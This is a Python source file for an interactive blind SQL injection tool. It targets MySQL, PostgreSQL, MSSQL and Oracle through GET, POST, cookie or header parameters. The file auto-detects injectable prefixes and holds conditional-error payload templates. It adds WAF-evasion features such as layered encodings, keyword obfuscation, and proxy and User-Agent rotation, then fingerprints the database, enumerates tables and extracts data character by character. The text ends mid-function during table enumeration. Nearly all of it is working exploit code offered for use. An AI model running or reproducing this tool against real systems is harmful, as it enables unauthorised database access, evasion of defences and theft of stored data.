#!/usr/bin/env python3
"""
Regan's Interactive Blind SQL Injection Automator (Fully Loaded + Concurrent + Sensitive)
Supports injection points: GET, POST (form/json), Cookie, Header.
Works with MySQL, PostgreSQL, MSSQL, Oracle.
Includes extensive WAF bypass and detection features:
- Multiple encoding/obfuscation techniques
- Expanded conditional response/error detection
- Debug mode for full transparency
- Random delays, proxy, User-Agent rotation
- Parameter pollution, content-type switching, method tampering
- Concurrent candidate testing with reduced redundancy
- More sensitive oracle detection and verification using stored responses
- Retry configuration excludes HTTP 500 so that error responses are preserved
- Simple and Advanced WAF bypass modes
"""

import requests
import sys
import time
import urllib3
import random
import re
import difflib
import logging
import base64
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, unquote, urlencode
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==============================
#  LOGGING SETUP
# ==============================
logger = logging.getLogger("SQLiAutomator")
logger.setLevel(logging.DEBUG)
if not logger.handlers:
    ch = logging.StreamHandler()
    ch.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s - %(message)s"))
    logger.addHandler(ch)

# ==============================
#  GLOBAL CONFIGURATION
# ==============================
config = {
    "target_url": "",
    "method": "GET",
    "injection_location": "cookie",
    "param_name": "TrackingId",
    "prefix": "",
    "suffix": "-- -",
    "true_indicator": "",
    "indicator_type": "contains",
    "indicator_value": "",
    "delay": 0.2,
    "proxies": {},
    "headers": {},
    "cookies": {},
    "db_type": None,
    "post_content_type": "form",
    "extra_post_fields": {},
    "original_value": "",
    "sqli_type": None,
    "error_template": None,
    "auto_detect": True,
    "obfuscate": False,
    "random_delay": False,
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    ],
    # WAF BYPASS OPTIONS
    "debug": False,
    "encoding": "none",
    "obfuscation_mode": "none",
    "parameter_pollution": False,
    "content_type_switch": False,
    "method_tampering": False,
    "char_func_encoding": False,
    "hex_encoding": False,
    "base64_encoding": False,
    "concurrency": 5,
    # NEW ADVANCED OPTIONS
    "waf_level": "simple",              # "simple" or "advanced"
    "multi_layer_encoding": False,      # apply url -> double_url -> unicode in sequence
    "proxy_rotation": False,            # rotate through a list of proxies
    "proxy_list": [],                   # list of proxy strings
    "advanced_obfuscation": False,      # enable versioned comments, whitespace alternatives
    "dynamic_delay": False,             # gradually increase delay
}

# Store extracted data for later phases
last_usernames = []
target_user = None
extracted_password = None

# Global request counter for dynamic delay
request_counter = 0

# ==============================
#  SESSION MANAGEMENT
# ==============================
def create_session_with_retry():
    s = requests.Session()
    retry = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[429, 502, 503, 504],   # 500 removed so error responses are kept
        allowed_methods=["GET", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s

def create_session_with_cookies(source_session=None):
    s = create_session_with_retry()
    if source_session is not None:
        for cookie in source_session.cookies:
            s.cookies.set(cookie.name, cookie.value, domain=cookie.domain, path=cookie.path)
    return s

# Main session (global)
session = create_session_with_retry()

# Thread-local storage for per-worker config overrides
thread_local = threading.local()

def get_effective_config(key):
    """Return thread-local value if present, else global config."""
    if hasattr(thread_local, 'config') and key in thread_local.config:
        return thread_local.config[key]
    return config.get(key)

def set_thread_local_config(**kwargs):
    if not hasattr(thread_local, 'config'):
        thread_local.config = {}
    thread_local.config.update(kwargs)

def clear_thread_local_config():
    if hasattr(thread_local, 'config'):
        delattr(thread_local, 'config')

# ==============================
#  DEBUG HELPER
# ==============================
def debug_log(msg):
    if get_effective_config("debug"):
        print(msg)

def debug_show_responses(r_true, r_false):
    if get_effective_config("debug"):
        print(f"    TRUE  status={r_true.status_code}, len={len(r_true.text)}")
        print(f"    FALSE status={r_false.status_code}, len={len(r_false.text)}")
        # Print first 200 characters, replacing newlines for compactness
        print(f"    TRUE  body: {r_true.text[:200].replace(chr(10), ' ')}")
        print(f"    FALSE body: {r_false.text[:200].replace(chr(10), ' ')}")

# ==============================
#  WAF BYPASS TRANSFORMATIONS
# ==============================
def apply_encoding(payload, mode):
    if mode == "url":
        return quote(payload, safe='')
    elif mode == "double_url":
        return quote(quote(payload, safe=''), safe='')
    elif mode == "unicode":
        replacements = {
            "'": "%u0027",
            '"': "%u0022",
            " ": "%u0020",
            "#": "%u0023",
            "=": "%u003d",
            "(": "%u0028",
            ")": "%u0029",
            "-": "%u002d",
        }
        for k, v in replacements.items():
            payload = payload.replace(k, v)
        return payload
    return payload

def apply_multi_encoding(payload):
    """Apply multiple encodings in sequence: URL -> double URL -> Unicode."""
    if get_effective_config("multi_layer_encoding"):
        # Example: first URL encode, then double URL encode, then Unicode replace
        payload = apply_encoding(payload, "url")
        payload = apply_encoding(payload, "double_url")
        payload = apply_encoding(payload, "unicode")
        debug_log(f"Multi-layer encoded payload: {payload}")
    return payload

def apply_obfuscation(payload, mode):
    if mode == "comments":
        space_repl = random.choice(["/**/", "/*!*/", "%09", "%0a", "%0d"])
        return payload.replace(" ", space_repl)
    elif mode == "case":
        keywords = ["AND", "OR", "SELECT", "FROM", "WHERE", "UNION", "CASE", "WHEN", "THEN", "ELSE", "END", "LENGTH", "SUBSTRING", "SUBSTR", "ASCII", "IF", "NULL", "IS", "NOT", "LIKE", "BETWEEN", "IN"]
        for kw in keywords:
            if kw in payload:
                new_kw = ''.join(random.choice([c.upper(), c.lower()]) for c in kw)
                payload = payload.replace(kw, new_kw)
        return payload
    elif mode == "operators":
        payload = payload.replace(" AND ", " && ").replace(" OR ", " || ")
        return payload
    elif mode == "parentheses":
        return f"(({payload}))"
    elif mode == "null_byte":
        return payload + "%00"
    elif mode == "versioned_comments":
        # MySQL versioned comments: /*!50000SELECT*/
        # Wrap keywords with version comments
        payload = payload.replace("SELECT", "/*!50000SELECT*/")
        payload = payload.replace("UNION", "/*!50000UNION*/")
        return payload
    elif mode == "whitespace_alternatives":
        # Replace spaces with tabs or newlines
        space_repl = random.choice(["\t", "\n", "\r", "\v", "\f"])
        return payload.replace(" ", space_repl)
    elif mode == "random":
        modes = ["comments", "case", "operators", "parentheses", "null_byte"]
        if get_effective_config("advanced_obfuscation"):
            modes += ["versioned_comments", "whitespace_alternatives"]
        chosen = random.sample(modes, random.randint(1, 2))
        for m in chosen:
            payload = apply_obfuscation(payload, m)
        return payload
    return payload

def transform_payload(payload):
    original = payload
    # If advanced multi-layer encoding is enabled, use that instead of single encoding
    if get_effective_config("multi_layer_encoding"):
        payload = apply_multi_encoding(payload)
    else:
        enc_mode = get_effective_config("encoding")
        if enc_mode != "none":
            payload = apply_encoding(payload, enc_mode)
            debug_log(f"After encoding ({enc_mode}): {payload}")

    obf_mode = get_effective_config("obfuscation_mode")
    if obf_mode != "none":
        payload = apply_obfuscation(payload, obf_mode)
        debug_log(f"After obfuscation ({obf_mode}): {payload}")

    if get_effective_config("hex_encoding"):
        hex_payload = "0x" + payload.encode().hex()
        debug_log(f"Hex encoded payload: {hex_payload}")
        payload = hex_payload

    if get_effective_config("base64_encoding"):
        b64_payload = base64.b64encode(payload.encode()).decode()
        debug_log(f"Base64 encoded payload: {b64_payload}")
        payload = b64_payload

    if get_effective_config("char_func_encoding"):
        payload = payload.replace("'", "CHAR(39)").replace('"', "CHAR(34)")
        debug_log(f"Char function encoding: {payload}")

    if payload != original:
        debug_log(f"Transformed payload: {payload}")
    return payload

# ==============================
#  CORE REQUEST FUNCTIONS
# ==============================
def send_request(injection, session_override=None):
    global request_counter
    headers = get_effective_config("headers").copy()
    user_agents = get_effective_config("user_agents")
    if user_agents:
        headers["User-Agent"] = random.choice(user_agents)

    injection = transform_payload(injection)

    sess = session_override if session_override is not None else session

    # Proxy rotation
    proxies = get_effective_config("proxies")
    if get_effective_config("proxy_rotation") and get_effective_config("proxy_list"):
        proxy_str = random.choice(get_effective_config("proxy_list"))
        proxies = {"http": proxy_str, "https": proxy_str}
        debug_log(f"Using proxy: {proxy_str}")

    try:
        cookies = sess.cookies.get_dict()
        pp = get_effective_config("parameter_pollution")
        method = get_effective_config("method").upper()
        if get_effective_config("method_tampering"):
            method = random.choice(["GET", "POST"])

        location = get_effective_config("injection_location")
        param_name = get_effective_config("param_name")
        original_value = get_effective_config("original_value")
        post_content_type = get_effective_config("post_content_type")

        if location == "cookie":
            cookies[param_name] = injection
            req_kwargs = {
                "cookies": cookies,
                "proxies": proxies,
                "headers": headers,
                "verify": False,
                "timeout": 10,
            }
            if method == "POST":
                return sess.post(get_effective_config("target_url"), **req_kwargs)
            return sess.get(get_effective_config("target_url"), **req_kwargs)

        elif location == "get":
            if pp:
                params = [(param_name, original_value), (param_name, injection)]
            else:
                params = {param_name: injection}
            if method == "POST":
                return sess.post(get_effective_config("target_url"), params=params, proxies=proxies,
                                 headers=headers, verify=False, timeout=10)
            return sess.get(get_effective_config("target_url"), params=params, proxies=proxies,
                            headers=headers, verify=False, timeout=10)

        elif location == "post":
            ct = post_content_type
            if get_effective_config("content_type_switch"):
                ct = random.choice(["form", "json"])
            payload = dict(get_effective_config("extra_post_fields"))
            payload[param_name] = injection
            if ct == "json":
                return sess.post(get_effective_config("target_url"), json=payload, proxies=proxies,
                                 headers=headers, verify=False, timeout=10)
            else:
                return sess.post(get_effective_config("target_url"), data=payload, proxies=proxies,
                                 headers=headers, verify=False, timeout=10)

        elif location == "header":
            headers[param_name] = injection
            data = get_effective_config("extra_post_fields") or None
            if method == "POST":
                return sess.post(get_effective_config("target_url"), data=data, headers=headers,
                                 proxies=proxies, verify=False, timeout=10)
            return sess.get(get_effective_config("target_url"), headers=headers, proxies=proxies,
                            verify=False, timeout=10)
    except Exception as e:
        logger.error("Request failed: %s", e)
        return None
    finally:
        request_counter += 1

def _apply_delay():
    global request_counter
    delay = get_effective_config("delay")
    if get_effective_config("random_delay"):
        delay = delay * random.uniform(0.8, 1.2)
    if get_effective_config("dynamic_delay"):
        # Gradually increase delay with each request (up to 5x original)
        delay = delay * min(1 + request_counter * 0.05, 5)
    time.sleep(delay)

def make_condition_payload(condition):
    if get_effective_config("sqli_type") == "conditional_error":
        if get_effective_config("error_template"):
            return condition
        else:
            return f"(SELECT CASE WHEN ({condition}) THEN 1/0 ELSE NULL END) IS NOT NULL"
    else:
        return condition

def send_injection(payload_fragment, session_override=None):
    if get_effective_config("sqli_type") == "conditional_error" and get_effective_config("error_template"):
        full_payload = get_effective_config("error_template").replace(
            "{original}", get_effective_config("original_value")
        ).replace("{condition}", payload_fragment)
        response = send_request(full_payload, session_override=session_override)
        debug_log(f"Conditional error payload sent: {full_payload}")
    else:
        injection = get_effective_config("prefix") + make_condition_payload(payload_fragment) + get_effective_config("suffix")
        response = send_request(injection, session_override=session_override)
        debug_log(f"Injection sent: {injection}")

    _apply_delay()
    return response

def send_injection_with_prefix_suffix(payload_fragment, prefix, suffix, session_override=None):
    injection = prefix + payload_fragment + suffix
    response = send_request(injection, session_override=session_override)
    _apply_delay()
    return response

def send_raw_injection(full_payload, session_override=None):
    response = send_request(full_payload, session_override=session_override)
    debug_log(f"Raw injection sent: {full_payload}")
    _apply_delay()
    return response

def is_true(payload_fragment, session_override=None):
    r = send_injection(payload_fragment, session_override=session_override)
    if r is None:
        return False
    itype = get_effective_config("indicator_type")
    if itype == "contains":
        val = get_effective_config("true_indicator")
        return bool(val) and (val in r.text)
    elif itype == "length_gt":
        return len(r.text) > int(get_effective_config("indicator_value"))
    elif itype == "length_lt":
        return len(r.text) < int(get_effective_config("indicator_value"))
    elif itype == "status_code":
        return r.status_code == int(get_effective_config("indicator_value"))
    elif itype == "header":
        h = get_effective_config("indicator_value")
        return r.headers.get(h) == get_effective_config("true_indicator")
    else:
        val = get_effective_config("true_indicator")
        return bool(val) and (val in r.text)

# ==============================
#  ORACLE DETECTION (MORE SENSITIVE)
# ==============================
# Define volatile headers that should be ignored when comparing responses
VOLATILE_HEADERS = {
    "date", "age", "expires", "x-request-id", "x-runtime",
    "x-amz-request-id", "x-cache", "cf-ray", "etag", "last-modified",
    "set-cookie", "x-nf-request-id", "x-vercel-request-id", "keep-alive", "connection"
}

def set_oracle_from_responses(r_true, r_false):
    target = thread_local.config if hasattr(thread_local, 'config') else config

    # 1. Status code
    if r_true.status_code != r_false.status_code:
        target["indicator_type"] = "status_code"
        target["indicator_value"] = str(r_true.status_code)
        debug_log(f"Oracle set to status_code: {target['indicator_value']}")
        return True

    # 2. Header difference (only stable headers)
    all_headers = set(r_true.headers.keys()) | set(r_false.headers.keys())
    for h in all_headers:
        # Skip volatile/dynamic headers
        if h.lower() in VOLATILE_HEADERS:
            continue
        if r_true.headers.get(h) != r_false.headers.get(h):
            target["indicator_type"] = "header"
            target["indicator_value"] = h
            target["true_indicator"] = r_true.headers.get(h, "")
            debug_log(f"Oracle set to header: {h} = {target['true_indicator']}")
            return True

    # 3. Body length difference (threshold >5)
    len_diff = len(r_true.text) - len(r_false.text)
    if abs(len_diff) > 5:
        if len_diff > 0:
            target["indicator_type"] = "length_gt"
            target["indicator_value"] = str(len(r_false.text))
            debug_log(f"Oracle set to length_gt: {target['indicator_value']}")
        else:
            target["indicator_type"] = "length_lt"
            target["indicator_value"] = str(len(r_false.text))
            debug_log(f"Oracle set to length_lt: {target['indicator_value']}")
        return True

    # 4. Whole line difference
    true_lines = r_true.text.splitlines()
    false_lines = r_false.text.splitlines()
    sm = difflib.SequenceMatcher(None, false_lines, true_lines)
    for tag, i1, i2, j1, j2 in sm.get_opcodes():
        if tag in ('insert', 'replace'):
            for line in true_lines[j1:j2]:
                stripped = line.strip()
                if stripped and len(stripped) > 3 and stripped not in r_false.text:
                    target["true_indicator"] = stripped[:80]
                    target["indicator_type"] = "contains"
                    debug_log(f"Oracle set to contains: '{target['true_indicator']}'")
                    return True

    # 5. Character-level diff fallback
    diff = list(difflib.ndiff(r_true.text, r_false.text))
    for line in diff:
        if line.startswith('+ ') and len(line) > 3:
            snippet = line[2:].strip()
            if snippet and snippet not in r_false.text:
                target["true_indicator"] = snippet[:80]
                target["indicator_type"] = "contains"
                debug_log(f"Oracle set to contains (char diff): '{snippet[:80]}'")
                return True

    return False

# ==============================
#  CONDITION PAIRS (reduced to two most universal)
# ==============================
CONDITION_PAIRS = [
    ("1=1", "1=2"),
    ("'a'='a", "'a'='b"),
]

def test_pair_for_oracle(session_override=None):
    for cond_true, cond_false in CONDITION_PAIRS:
        debug_log(f"Testing condition pair: {cond_true} vs {cond_false}")
        r_true = send_injection(cond_true, session_override=session_override)
        r_false = send_injection(cond_false, session_override=session_override)
        if r_true is None or r_false is None:
            continue

        if get_effective_config("debug"):
            debug_show_responses(r_true, r_false)

        if set_oracle_from_responses(r_true, r_false):
            # Verify using stored responses, not new requests
            itype = get_effective_config("indicator_type")
            if itype == "contains":
                val = get_effective_config("true_indicator")
                true_ok = val in r_true.text
                false_ok = val not in r_false.text
            elif itype == "length_gt":
                true_ok = len(r_true.text) > int(get_effective_config("indicator_value"))
                false_ok = len(r_false.text) <= int(get_effective_config("indicator_value"))
            elif itype == "length_lt":
                true_ok = len(r_true.text) < int(get_effective_config("indicator_value"))
                false_ok = len(r_false.text) >= int(get_effective_config("indicator_value"))
            elif itype == "status_code":
                true_ok = r_true.status_code == int(get_effective_config("indicator_value"))
                false_ok = r_false.status_code != int(get_effective_config("indicator_value"))
            elif itype == "header":
                h = get_effective_config("indicator_value")
                true_ok = r_true.headers.get(h) == get_effective_config("true_indicator")
                false_ok = r_false.headers.get(h) != get_effective_config("true_indicator")
            else:
                true_ok = false_ok = False

            if true_ok and false_ok:
                debug_log(f"Oracle verified using stored responses")
                return True
            else:
                debug_log("Oracle verification failed with stored responses, resetting")
                if hasattr(thread_local, 'config'):
                    thread_local.config["true_indicator"] = ""
                    thread_local.config["indicator_type"] = "contains"
                    thread_local.config["indicator_value"] = ""
                else:
                    config["true_indicator"] = ""
                    config["indicator_type"] = "contains"
                    config["indicator_value"] = ""
    return False

# ==============================
#  CANDIDATE GENERATION (reduced)
# ==============================
def generate_conditional_candidates(original):
    quote_chars = ["'", '"', "`", ""]
    paren_suffixes = ["", ")", "))", "')", '")', "`)"]
    connectors = [" AND ", " OR "]
    comments = ["-- -", "#", "/*", "--+", ""]

    candidates = []
    for q in quote_chars:
        for p in paren_suffixes:
            for conn in connectors:
                for comment in comments:
                    prefix = f"{original}{q}{p}{conn}"
                    suffix = comment if comment else ""
                    candidates.append((prefix, suffix))

    for p in paren_suffixes:
        for conn in connectors:
            for comment in comments:
                prefix = f"{original}{p}{conn}"
                suffix = comment if comment else ""
                candidates.append((prefix, suffix))

    seen = set()
    unique = []
    for c in candidates:
        if c not in seen:
            seen.add(c)
            unique.append(c)
    return unique

# ==============================
#  AUTO-DETECTION WITH CONCURRENCY
# ==============================
def auto_detect_injection_logic():
    print("\n[*] Auto-detecting injection logic...")
    original_value = get_effective_config("original_value")

    saved_prefix = get_effective_config("prefix")
    saved_suffix = get_effective_config("suffix")
    saved_sqli_type = get_effective_config("sqli_type")
    saved_delay = get_effective_config("delay")

    # Temporarily set delay to 0 for fast detection
    config["delay"] = 0.0
    if hasattr(thread_local, 'config'):
        thread_local.config["delay"] = 0.0

    concurrency = get_effective_config("concurrency")

    # Phase 1: Conditional response candidates
    candidates = generate_conditional_candidates(original_value)
    total = len(candidates)
    print(f"[*] Testing {total} conditional response candidates with {concurrency} threads...")

    found = threading.Event()
    result = {}

    def test_candidate(candidate):
        if found.is_set():
            return None
        prefix, suffix = candidate
        worker_session = create_session_with_cookies(session)
        thread_local.config = dict(config)
        thread_local.config["prefix"] = prefix
        thread_local.config["suffix"] = suffix
        thread_local.config["sqli_type"] = "conditional_response"

        try:
            success = test_pair_for_oracle(session_override=worker_session)
            if success:
                local = thread_local.config
                found.set()
                result['prefix'] = prefix
                result['suffix'] = suffix
                result['sqli_type'] = "conditional_response"
                result['indicator_type'] = local.get("indicator_type")
                result['true_indicator'] = local.get("true_indicator", "")
                result['indicator_value'] = local.get("indicator_value", "")
                return True
            return False
        finally:
            clear_thread_local_config()

    completed = 0
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = [executor.submit(test_candidate, cand) for cand in candidates]
        for future in as_completed(futures):
            future.result()
            completed += 1
            if completed % 20 == 0 or completed == total:
                print(f"    Progress: {completed}/{total} candidates tested")
            if found.is_set():
                for f in futures:
                    f.cancel()
                break

    if found.is_set():
        config["delay"] = saved_delay
        config["prefix"] = result['prefix']
        config["suffix"] = result['suffix']
        config["sqli_type"] = result['sqli_type']
        config["indicator_type"] = result['indicator_type']
        config["true_indicator"] = result['true_indicator']
        config["indicator_value"] = result['indicator_value']
        print(f"[+] Found working conditional response:")
        print(f"    Prefix: {config['prefix']}")
        print(f"    Suffix: {config['suffix']}")
        print(f"    Oracle: {config['indicator_type']} = {config.get('indicator_value') or config.get('true_indicator')}")
        return True

    # Phase 2: Conditional error templates
    print("[*] Testing conditional error templates...")
    error_templates = [
        ("{original}' || (SELECT CASE WHEN ({condition}) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '-- ", "oracle"),
        ("{original} || (SELECT CASE WHEN ({condition}) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '-- ", "oracle"),
        ("{original}' || (SELECT CASE WHEN ({condition}) THEN CAST('ERR' AS INTEGER) ELSE 1 END) || '-- ", "postgresql"),
        ("{original} || (SELECT CASE WHEN ({condition}) THEN CAST('ERR' AS INTEGER) ELSE 1 END) || '-- ", "postgresql"),
        ("{original}' AND (SELECT CASE WHEN ({condition}) THEN 1/0 ELSE NULL END) IS NOT NULL-- ", "postgresql"),
        ("{original}' AND (SELECT IF({condition}, UPDATEXML(1, CONCAT(0x7e,'ERR',0x7e), 1), 1))-- ", "mysql"),
        ("{original}' AND (SELECT IF({condition}, EXTRACTVALUE(1, CONCAT(0x7e,'ERR',0x7e)), 1))-- ", "mysql"),
        ("{original}' AND (SELECT CASE WHEN ({condition}) THEN (SELECT table_name FROM information_schema.tables) ELSE 1 END)-- ", "mysql"),
        ("{original}' + (SELECT CASE WHEN ({condition}) THEN CONVERT(int,'ERR') ELSE '' END) + '-- ", "mssql"),
        ("{original}' AND (SELECT CASE WHEN ({condition}) THEN 1/0 ELSE NULL END) IS NOT NULL-- ", "mssql"),
    ]

    found.clear()
    result = {}

    def test_error_template(item):
        if found.is_set():
            return None
        template, db = item
        worker_session = create_session_with_cookies(session)
        thread_local.config = dict(config)
        thread_local.config["sqli_type"] = "conditional_error"
        thread_local.config["error_template"] = template
        thread_local.config["db_type"] = db
        thread_local.config["prefix"] = ""
        thread_local.config["suffix"] = ""

        try:
            true_payload = template.replace("{original}", original_value).replace("{condition}", "1=1")
            false_payload = template.replace("{original}", original_value).replace("{condition}", "1=2")

            r_true = send_raw_injection(true_payload, session_override=worker_session)
            r_false = send_raw_injection(false_payload, session_override=worker_session)
            if r_true is None or r_false is None:
                return False

            if get_effective_config("debug"):
                debug_show_responses(r_true, r_false)

            if set_oracle_from_responses(r_true, r_false):
                # Verify using stored responses
                itype = get_effective_config("indicator_type")
                if itype == "contains":
                    val = get_effective_config("true_indicator")
                    true_ok = val in r_true.text
                    false_ok = val not in r_false.text
                elif itype == "length_gt":
                    true_ok = len(r_true.text) > int(get_effective_config("indicator_value"))
                    false_ok = len(r_false.text) <= int(get_effective_config("indicator_value"))
                elif itype == "length_lt":
                    true_ok = len(r_true.text) < int(get_effective_config("indicator_value"))
                    false_ok = len(r_false.text) >= int(get_effective_config("indicator_value"))
                elif itype == "status_code":
                    true_ok = r_true.status_code == int(get_effective_config("indicator_value"))
                    false_ok = r_false.status_code != int(get_effective_config("indicator_value"))
                elif itype == "header":
                    h = get_effective_config("indicator_value")
                    true_ok = r_true.headers.get(h) == get_effective_config("true_indicator")
                    false_ok = r_false.headers.get(h) != get_effective_config("true_indicator")
                else:
                    true_ok = false_ok = False

                if true_ok and false_ok:
                    found.set()
                    local = thread_local.config
                    result['template'] = template
                    result['db'] = db
                    result['sqli_type'] = "conditional_error"
                    result['indicator_type'] = local.get("indicator_type")
                    result['true_indicator'] = local.get("true_indicator", "")
                    result['indicator_value'] = local.get("indicator_value", "")
                    return True
            return False
        finally:
            clear_thread_local_config()

    completed = 0
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = [executor.submit(test_error_template, item) for item in error_templates]
        for future in as_completed(futures):
            future.result()
            completed += 1
            print(f"    Progress: {completed}/{len(error_templates)} error templates tested")
            if found.is_set():
                for f in futures:
                    f.cancel()
                break

    config["delay"] = saved_delay

    if found.is_set():
        config["sqli_type"] = "conditional_error"
        config["error_template"] = result['template']
        config["db_type"] = result['db']
        config["indicator_type"] = result['indicator_type']
        config["true_indicator"] = result['true_indicator']
        config["indicator_value"] = result['indicator_value']
        config["prefix"] = ""
        config["suffix"] = ""
        print(f"[+] Found working conditional error payload:")
        print(f"    Template: {config['error_template']}")
        print(f"    Database: {config['db_type']}")
        print(f"    Oracle: {config['indicator_type']} = {config.get('indicator_value') or config.get('true_indicator')}")
        return True

    config["prefix"] = saved_prefix
    config["suffix"] = saved_suffix
    config["sqli_type"] = saved_sqli_type
    print("[!] Blind SQLi not found.")
    return False

# ==============================
#  HELPER: Clean user input
# ==============================
def clean_subquery_input(user_input):
    """Remove accidental database label prefixes from user input."""
    user_input = user_input.strip()
    for prefix in ["MySQL:", "PostgreSQL:", "MSSQL:", "Oracle:"]:
        if user_input.startswith(prefix):
            return user_input[len(prefix):].strip()
    return user_input

# ==============================
#  EXTRACTION HELPERS
# ==============================
def get_length(subquery, max_len=200):
    print(f"[*] Finding length of ({subquery})...")

    if get_effective_config("db_type") == "mssql":
        len_funcs = ["LEN", "LENGTH"]
    else:
        len_funcs = ["LENGTH", "LEN"]

    for len_func in len_funcs:
        for i in range(1, max_len + 1):
            condition = f"{len_func}(({subquery}))={i}"
            if is_true(condition):
                print(f"[+] Length = {i} (using {len_func})")
                return i
        print(f"    No result with {len_func}, trying next function...")
    print("[!] Length not found (or > max_len).")
    return None

def binary_search_ascii(subquery, pos, substr_func):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        condition = f"ASCII({substr_func}(({subquery}),{pos},1)) <= {mid}"
        if is_true(condition):
            high = mid
        else:
            low = mid + 1

    condition = f"ASCII({substr_func}(({subquery}),{pos},1)) = {low}"
    if is_true(condition):
        return low
    else:
        return None

def extract_string(subquery, length):
    print(f"[*] Extracting string of length {length}...")

    if get_effective_config("db_type") == "oracle":
        substr_funcs = ["SUBSTR", "SUBSTRING"]
    else:
        substr_funcs = ["SUBSTRING", "SUBSTR"]

    for substr_func in substr_funcs:
        result = ""
        success = True
        for pos in range(1, length + 1):
            code = binary_search_ascii(subquery, pos, substr_func)
            if code is not None:
                result += chr(code)
                print(f"    Pos {pos}: '{chr(code)}' (ASCII {code}) -> {result}")
            else:
                print(f"    No printable char at pos {pos} using {substr_func}, switching function...")
                success = False
                break
        if success:
            print(f"[+] Extracted using {substr_func}: {result}")
            return result

    print("[!] Failed to extract with available functions.")
    return result if 'result' in locals() else ""

# ==============================
#  PHASE FUNCTIONS
# ==============================
def phase_confirm_injection():
    print("\n=== Phase 1: Confirm Blind SQLi ===")
    if config.get("auto_detect", True):
        if auto_detect_injection_logic():
            true_res = is_true("1=1")
            false_res = is_true("1=2")
            print(f"TRUE  -> {true_res}")
            print(f"FALSE -> {false_res}")
            if true_res and not false_res:
                if config["sqli_type"] == "conditional_error":
                    print("[+] Blind SQL conditional error SQLi confirmed with auto-detected payload.")
                else:
                    print("[+] Blind SQL conditional response SQLi confirmed with auto-detected payload.")
                return True
            else:
                print("[!] Auto-detected prefix failed verification.")
                return False
        else:
            print("[!] Could not auto-detect. Please configure manually if you want to test manually.")
            return False
    else:
        print("Testing oracle with TRUE and FALSE...")
        true_res = is_true("1=1")
        false_res = is_true("1=2")
        print(f"TRUE  -> {true_res}")
        print(f"FALSE -> {false_res}")
        if true_res and not false_res:
            if config["sqli_type"] == "conditional_error":
                print("[+] Blind SQL conditional error SQLi confirmed.")
            else:
                print("[+] Blind SQL conditional response SQLi confirmed.")
            return True
        else:
            print("[!] Oracle does not distinguish true/false. Please reconfigure.")
            return False

def phase_identify_database():
    print("\n=== Phase 2: Identify Database ===")
    if config["sqli_type"] == "conditional_error":
        print("[*] Conditional error detected. Testing DB-specific error templates...")
        original_value = config["original_value"]
        error_templates = [
            ("{original}' || (SELECT CASE WHEN ({condition}) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '-- ", "oracle"),
            ("{original}' || (SELECT CASE WHEN ({condition}) THEN CAST('ERR' AS INTEGER) ELSE 1 END) || '-- ", "postgresql"),
            ("{original}' AND (SELECT IF({condition}, UPDATEXML(1, CONCAT(0x7e,'ERR',0x7e), 1), 1))-- ", "mysql"),
            ("{original}' + (SELECT CASE WHEN ({condition}) THEN CONVERT(int,'ERR') ELSE '' END) + '-- ", "mssql"),
        ]
        for template, db in error_templates:
            true_payload = template.replace("{original}", original_value).replace("{condition}", "1=1")
            false_payload = template.replace("{original}", original_value).replace("{condition}", "1=2")
            r_true = send_raw_injection(true_payload)
            r_false = send_raw_injection(false_payload)
            if r_true is None or r_false is None:
                continue
            if set_oracle_from_responses(r_true, r_false):
                config["db_type"] = db
                config["error_template"] = template
                config["sqli_type"] = "conditional_error"
                config["prefix"] = ""
                config["suffix"] = ""
                print(f"[+] Database identified as {db}.")
                return db
        print("[*] Could not identify database.")
        return None
    else:
        tests = [
            ("MySQL", "database() IS NOT NULL"),
            ("PostgreSQL", "current_database() IS NOT NULL"),
            ("MSSQL", "@@version IS NOT NULL"),
            ("Oracle", "(SELECT 1 FROM v$version) IS NOT NULL"),
        ]
        for db, cond in tests:
            print(f"Testing {db}: {cond}")
            if is_true(cond):
                print(f"[+] Database appears to be {db}.")
                config["db_type"] = db.lower()
                return db
        print("[*] Could not identify database.")
        return None

def phase_confirm_table_exists(table_name):
    print(f"\n=== Phase 3: Confirm Table '{table_name}' Exists ===")
    condition = f"(SELECT COUNT(*) FROM {table_name}) > 0"
    if is_true(condition):
        print(f"[+] Table '{table_name}' exists.")
        return True
    else:
        print(f"[-] Table '{table_name}' does not exist (or access denied).")
        return False

def get_default_subquery_for_phase4():
    if config["db_type"] == "oracle":
        return "SELECT table_name FROM user_tables WHERE ROWNUM=1"
    elif config["db_type"] == "postgresql":
        return "SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {offset}"
    elif config["db_type"] == "mssql":
        return "SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES"
    else:
        return "SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {offset}"

def phase_enumerate_tables():
    print("\n=== Phase 4: Enumerate Table Names ===")
    print("Provide a subquery template with {offset} placeholder.")
    print("Examples:")
    print("  MySQL:      SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {offset}")
    print("  PostgreSQL: SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {offset}")
    print("  MSSQL:      SELECT table_name FROM information_schema.tables ORDER BY table_name OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY")
    print("  Oracle:     SELECT table_name FROM user_tables WHERE ROWNUM=1")
    subquery_template = input("> ").strip()
    subquery_template = clean_subquery_input(subquery_template)
